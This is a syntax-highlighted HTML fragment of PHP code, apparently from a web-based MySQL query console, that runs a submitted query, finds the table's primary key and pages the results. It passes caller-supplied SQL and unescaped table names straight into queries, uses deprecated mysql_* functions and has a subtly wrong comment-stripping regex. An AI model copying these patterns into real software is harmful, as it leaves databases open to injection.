<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;p&gt;&lt;b&gt;Query#</span><span style="color: #f0c674;">{$num}</span><span style="color: #8abeb7;"> : "</span>.htmlspecialchars(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span>,<span style="color: #81a2be;">EN</span><span style="color: #81a2be; text-decoration: underline;">T_QUOTES</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">"&lt;/b&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">switch</span>(qy(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span>))
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">case</span> 0:
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;Error : '</span>.mysql_error().<span style="color: #8abeb7;">'&lt;/h2&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">break</span>;<span style="color: #de935f; background-color: #373b41;">  </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">case</span> 1:
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (strtolower(substr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span>,0,13)) == <span style="color: #8abeb7;">'sele</span><span style="color: #8abeb7; text-decoration: underline;">ct * from'</span><span style="text-decoration: underline;">) {</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">allowedit</span> = 1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">getnumsql</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tatol</span> = mysql_num_rows(q(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">getnumsql</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">multipage</span> = multi(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tatol</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pagenum</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pa</span><span style="color: #f0c674; text-decoration: underline;">ge</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql_line</span> = str_replace(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">"\r"</span>, <span style="color: #8abeb7;">"\n"</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">"\t"</span><span style="text-decoration: underline;">), </span><span style="color: #b5bd68; text-decoration: underline;">array</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">' '</span><span style="text-decoration: underline;">), trim(htmlspecialchars(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">query</span><span style="text-decoration: underline;">)));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql_line</span> = preg_replace(<span style="color: #8abeb7;">"/\/\*[^(\*\/)]</span><span style="color: #8abeb7; text-decoration: underline;">*\*\//i"</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">" "</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">sql_line</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   preg_match_all(<span style="color: #8abeb7;">"/from\s+`{0,1}([\w]+)`{0</span><span style="color: #8abeb7; text-decoration: underline;">,1}\s+/i"</span><span style="text-decoration: underline;">,</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">sql_line</span><span style="text-decoration: underline;">,</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">matches</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">matches</span>[1][0];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/*********************</span><span style="color: #969896; font-style: italic;">/</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">getfield</span> = q(<span style="color: #8abeb7;">"SHOW COLUMNS FROM </span><span style="color: #f0c674;">$tablename</span><span style="color: #8abeb7;">"</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rowdb</span> = <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">keyfied</span> = <span style="color: #8abeb7;">''</span>; <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#20027;&#38190;&#23383;&#27573;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span> = @mysql_fetch_assoc(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">getfield</span>)) <span style="text-decoration: underline;">{</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rowdb</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>]][<span style="color: #8abeb7;">'Key'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Key</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">];</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rowdb</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>]][<span style="color: #8abeb7;">'Extra'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'E</span><span style="color: #8abeb7; text-decoration: underline;">xtra'</span><span style="text-decoration: underline;">];</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Key'</span>] == <span style="color: #8abeb7;">'UNI'</span> || <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Key'</span>] <span style="text-decoration: underline;">== </span><span style="color: #8abeb7; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">keyfied</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/*********************</span><span style="color: #969896; font-style: italic;">/</span><span style="color: #de935f; background-color: #373b41;">                     </span><span style="color: #de935f; background-color: #373b41; text-decoration: underline;">            </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#30452;&#25509;&#27983;&#35272;&#34920;&#25353;&#29031;&#20027;&#38190;&#38477;&#24207;&#25490;&#21015;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">keyfied</span> &amp;&amp; strtolower(substr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span>,0,1<span style="text-decoration: underline;">3)) == </span><span style="color: #8abeb7; text-decoration: underline;">'select * from'</span><span style="text-decoration: underline;">) {</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span> = str_replace(<span style="color: #8abeb7;">" LIMIT "</span>, <span style="color: #8abeb7;">" order </span><span style="color: #8abeb7; text-decoration: underline;">by </span><span style="color: #f0c674; text-decoration: underline;">$keyfied</span><span style="color: #8abeb7; text-decoration: underline;"> DESC LIMIT "</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">query</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> = q(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span>);

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">multipage</span>);
